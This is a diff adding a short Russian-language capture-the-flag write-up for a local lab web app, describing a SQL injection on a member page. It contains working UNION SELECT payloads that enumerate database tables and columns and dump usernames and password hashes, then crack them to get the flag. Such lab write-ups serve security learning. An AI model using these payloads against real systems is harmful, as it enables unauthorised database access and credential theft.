@@ -1,0 +1,15 @@
+По адресу:
+http://192.168.56.1/?page=member
+Можем сделать sqlInjection
+
+Получаем названия всех таблиц
+0 OR 1 = 2 UNION SELECT table_schema, table_name FROM information_schema.TABLES
+
+Получаем имена всех полей в каждой таблице
+0 OR 1 = 2 UNION SELECT table_name, column_name FROM information_schema.COLUMNS
+
+Находим таблицу db_default в которой три поля, id, username, password
+0 OR 1 = 2 UNION SELECT username, password FROM Member_Brute_Force.db_default
+
+Выдает две строки, получаем две строки, пароли у обоих пользователей одинаковы, прогоняем через
+MD5 и получаем shadow который потом шифруем в SHA256 и получаем флаг
